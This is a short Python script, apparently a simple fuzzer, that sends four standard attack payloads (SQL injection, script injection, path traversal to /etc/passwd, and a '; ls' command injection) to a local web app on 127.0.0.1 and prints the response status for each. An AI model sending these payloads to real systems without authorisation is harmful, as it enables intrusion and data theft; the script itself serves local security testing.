import requests

target = "http://127.0.0.1:5000"

payloads = [
    "' OR '1'='1",
    "<script>alert(1)</script>",
    "../../etc/passwd",
    "; ls"
]

for payload in payloads:
    r = requests.get(target, params={"input": payload})
    print(f"Payload: {payload} | Status: {r.status_code}")
